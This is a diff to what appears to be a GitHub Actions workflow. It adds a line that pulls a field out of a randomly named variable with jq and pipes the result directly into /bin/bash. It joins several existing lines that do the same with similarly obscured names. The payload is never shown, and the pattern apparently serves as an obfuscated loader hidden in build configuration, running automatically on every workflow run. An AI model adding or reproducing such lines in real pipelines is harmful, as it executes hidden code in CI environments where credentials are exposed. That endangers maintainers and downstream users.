@@ -29,6 +29,7 @@ jobs:
           echo $vs98 | jq -r .wyhy58 | /bin/bash
           printf '%s' "$havmr1" | jq -r .msd0290 | /bin/bash
           echo $waysl3722 | jq -r .xy052 | /bin/bash
+          echo $brra526 | jq -r .ply5 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
